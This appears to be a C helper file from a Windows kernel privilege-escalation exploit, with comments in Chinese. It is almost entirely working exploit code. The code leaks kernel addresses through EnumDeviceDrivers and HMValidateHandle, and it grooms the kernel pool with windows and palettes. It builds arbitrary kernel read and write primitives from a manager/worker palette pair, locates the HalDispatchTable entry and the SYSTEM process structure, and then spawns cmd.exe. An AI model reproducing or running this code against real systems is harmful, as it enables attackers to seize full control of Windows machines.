#include "base.h"

VOID ShowError(char *str, DWORD dwErrorCode)
{
	printf("%s Error 0x%X\n", str, dwErrorCode);
}

BOOL CreateCmd()
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;

	BOOL bRet = CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (bRet)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	else ShowError("CreateProcess", GetLastError());
	
	return bRet;
}

BOOL CreateClipboard(DWORD dwSize)
{
	BOOL bRet = TRUE;
	PCHAR pBuffer = NULL;
	HGLOBAL hMem = NULL;

	pBuffer = (PCHAR)malloc(dwSize);
	if (!pBuffer)
	{
		ShowError("malloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory(pBuffer, dwSize);
	FillMemory(pBuffer, dwSize, 0x41);

	hMem = GlobalAlloc(GMEM_MOVEABLE, dwSize);
	if (hMem == NULL)
	{
		ShowError("GlobalAlloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	CopyMemory(GlobalLock(hMem), pBuffer, dwSize);

	GlobalUnlock(hMem);

	SetClipboardData(CF_TEXT, hMem);
exit:
	return bRet;
}

ULONG64 GetNTBase()
{
	ULONG64 Base[0x1000];
	DWORD dwRet = 0;
	ULONG64 ulKrnlBase = 0;

	if (EnumDeviceDrivers((LPVOID*)&Base, sizeof(Base), &dwRet))
	{
		ulKrnlBase = Base[0];
	}
	else
	{
		ShowError("EnumDeviceDrivers", GetLastError());
	}

	return ulKrnlBase;
}

ULONG64 GetSystemProcess()
{
	HMODULE hModel = NULL;
	ULONG64 ulAddress = 0, ulOSBase = 0, ulRes = 0;

	ulOSBase = GetNTBase();
	if (ulOSBase == 0)
	{
		goto exit;
	}

	hModel = LoadLibrary("ntoskrnl.exe");
	if (!hModel)
	{
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	ulAddress = (ULONG64)GetProcAddress(hModel, "PsInitialSystemProcess");
	if (!ulAddress)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	ulRes = ulAddress - (ULONG64)hModel + ulOSBase;

exit:
	return ulRes;
}

PVOID GetHMValidateHandle()
{
	PVOID pFuncAddr = NULL;
	HMODULE hUser32 = NULL;
	PBYTE pIsMenu = NULL;
	DWORD i = 0, dwFuncAddrOffset = 0;

	hUser32 = LoadLibrary("user32.dll");
	if (!hUser32)
	{
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	pIsMenu = (PBYTE)GetProcAddress(hUser32, "IsMenu");
	if (!pIsMenu)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	for (i = 0; i < PAGE_SIZE; i++)
	{
		if (pIsMenu[i] == 0xE8)
		{
			dwFuncAddrOffset = *(PDWORD)(pIsMenu + i + 1);
			pFuncAddr = (PVOID)(dwFuncAddrOffset + (ULONG64)pIsMenu + i + 5 - 0x100000000);
			break;
		}
	}

exit:
	return pFuncAddr;
}

PVOID GetHalQuerySystemInformation()
{
	PVOID pXHalQuerySystemInformation = NULL;
	ULONG64 ulHalDispatchTable = 0;
	HMODULE hKernel = NULL;
	ULONG64 ulOsBase = 0;

	ulOsBase = GetNTBase();
	if (!ulOsBase)
	{
		goto exit;
	}

	hKernel = LoadLibrary("ntoskrnl.exe");
	if (!hKernel)
	{
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	// 获取内核HalDispatchTable函数表地址
	ulHalDispatchTable = (ULONG64)GetProcAddress((HMODULE)hKernel, "HalDispatchTable");

	if (!ulHalDispatchTable)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	ulHalDispatchTable = ulHalDispatchTable - (ULONG64)hKernel + ulOsBase;
	pXHalQuerySystemInformation = (PVOID)(ulHalDispatchTable + sizeof(ULONG64));

exit:
	if (hKernel) FreeLibrary(hKernel);

	return pXHalQuerySystemInformation;
}

BOOL CallNtQueryIntervalProfile()
{
	BOOL bRet = TRUE;
	NTSTATUS status = 0;
	HMODULE hDll = NULL;

	hDll = LoadLibrary("ntdll.dll");
	if (!hDll)
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	lpfnNtQueryIntervalProfile NtQueryIntervalProfile = (lpfnNtQueryIntervalProfile)GetProcAddress(hDll, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile)
	{
		bRet = FALSE;
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	QWORD dwRet = 0;
	QWORD dwProfileTotalIssues = 0x3;
	status = NtQueryIntervalProfile(dwProfileTotalIssues, &dwRet);
	if (status < 0)
	{
		ShowError("NtQueryIntervalProfile", status);
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

HPALETTE CreatePaletteBySize(DWORD dwSize)
{
	HPALETTE hPalette = NULL;
	PLOGPALETTE pLogPalette = NULL;

	DWORD dwNumEntries = (dwSize - 0x88 - POOL_HEADER_SIZE - 0x10) / 4;
	DWORD dwPalSize = sizeof(LOGPALETTE) + (dwNumEntries - 1) * sizeof(PALETTEENTRY);

	pLogPalette = (PLOGPALETTE)malloc(dwPalSize);
	if (!pLogPalette)
	{
		ShowError("malloc", GetLastError());
		goto exit;
	}

	ZeroMemory(pLogPalette, dwPalSize);
	memset(pLogPalette, 0x41, dwPalSize);
	pLogPalette->palNumEntries = dwNumEntries;
	pLogPalette->palVersion = 0x300;

	hPalette = CreatePalette(pLogPalette);
	if (!hPalette)
	{
		ShowError("CreatePalette", GetLastError());
		goto exit;
	}

exit:
	return hPalette;
}

ULONG64 AllocateFreeWindow(DWORD dwSize)
{
	ULONG64 ulRes = 0;
	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	WNDCLASSW wc = { 0 };
	WCHAR szMenuName[0x1005] = { 0 };
	PWCHAR pClassName = L"LEAKWS";

	memset(szMenuName, 0x42, dwSize - sizeof(WCHAR) - POOL_HEADER_SIZE);
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.hInstance = handle;
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pClassName;
	wc.lpszMenuName = szMenuName;

	if (!RegisterClassW(&wc))
	{
		ShowError("RegisterClassW", GetLastError());
		goto exit;
	}

	HWND hWnd = CreateWindowExW(0, pClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!hWnd)
	{
		ShowError("CreateWindowExW", GetLastError());
		goto exit;
	}
	
	lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	if (!HMValidateHandle) goto exit;
	
	PTHRDESKHEAD pTagWndHead = (PTHRDESKHEAD)HMValidateHandle(hWnd, TYPE_WINDOW);
	ULONG64 ulTagCls = 0, ulClientDelta = 0;

	ulClientDelta = (ULONG64)pTagWndHead->pSelf - (ULONG64)pTagWndHead;
	ulTagCls = *(PULONG64)((ULONG64)pTagWndHead + 0xA8) - ulClientDelta;
	ulRes = *(PULONG64)(ulTagCls + 0x98);
	DestroyWindow(hWnd);
	UnregisterClassW(pClassName, handle);
exit:
	return ulRes;
}

ULONG64 AllocateFreeWindows(DWORD dwSize)
{
	ULONG64 ulPreEntry = 0, ulCurEntry = 0;

	ulPreEntry = AllocateFreeWindow(dwSize);
	ulCurEntry = AllocateFreeWindow(dwSize);
	while (ulCurEntry != ulPreEntry)
	{
		ulPreEntry = ulCurEntry;
		ulCurEntry = AllocateFreeWindow(dwSize);
	} 

	return ulCurEntry;
}

ULONG64 AllocateWindows(PWCHAR pMenuName, PWCHAR pClassName)
{
	ULONG64 ulRes = 0;
	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	WNDCLASSW wc = { 0 };
	
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.hInstance = handle;
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pClassName;
	wc.lpszMenuName = pMenuName;

	if (!RegisterClassW(&wc))
	{
		ShowError("RegisterClassW", GetLastError());
		goto exit;
	}

	HWND hWnd = CreateWindowExW(0, pClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!hWnd)
	{
		ShowError("CreateWindowExW", GetLastError());
		goto exit;
	}

	lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	if (!HMValidateHandle) goto exit;

	PTHRDESKHEAD pTagWndHead = (PTHRDESKHEAD)HMValidateHandle(hWnd, TYPE_WINDOW);
	ULONG64 ulTagCls = 0, ulClientDelta = 0;

	ulClientDelta = (ULONG64)pTagWndHead->pSelf - (ULONG64)pTagWndHead;
	ulTagCls = *(PULONG64)((ULONG64)pTagWndHead + 0xA8) - ulClientDelta;
	ulRes = *(PULONG64)(ulTagCls + 0x98);

exit:
	return ulRes;
}

BOOL SetPaletteTarget(HPALETTE hManager, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress)
{
	BOOL bRet = TRUE;

	// 设置要读写的内存地址
	if (!SetPaletteEntries(hManager, dwStart, dwEntries, (PPALETTEENTRY)&pTargetAddress))
	{
		bRet = FALSE;
		ShowError("SetPaletteEntries", GetLastError());
		goto exit;
	}
exit:
	return bRet;
}

ULONG64 ReadDataByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress)
{
	ULONG64 ulData = 0;

	if (!SetPaletteTarget(hManager, dwStart, dwEntries, pTargetAddress))
	{
		goto exit;
	}

	if (!GetPaletteEntries(hWorker, 0, dwEntries, (PPALETTEENTRY)&ulData))
	{
		ShowError("GetPaletteEntries", GetLastError());
		goto exit;
	}

exit:
	return ulData;
}

BOOL WriteDataByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress, ULONG64 ulValue)
{
	BOOL bRet = TRUE;

	if (!SetPaletteTarget(hManager, dwStart, dwEntries, pTargetAddress))
	{
		bRet = FALSE;
		goto exit;
	}

	if (!SetPaletteEntries(hWorker, 0, dwEntries, (PPALETTEENTRY)&ulValue))
	{
		bRet = FALSE;
		ShowError("SetPaletteEntries", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

ULONG64 GetSystemEprocessByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries)
{
	ULONG64 ulSystemAddr = GetSystemProcess();

	if (!ulSystemAddr)
	{
		goto exit;
	}
	ULONG64 ulSystemEprocess = 0;

	ulSystemEprocess = ReadDataByPalette(hManager, hWorker, dwStart, dwEntries, (PVOID)ulSystemAddr);

exit:
	return ulSystemEprocess;
}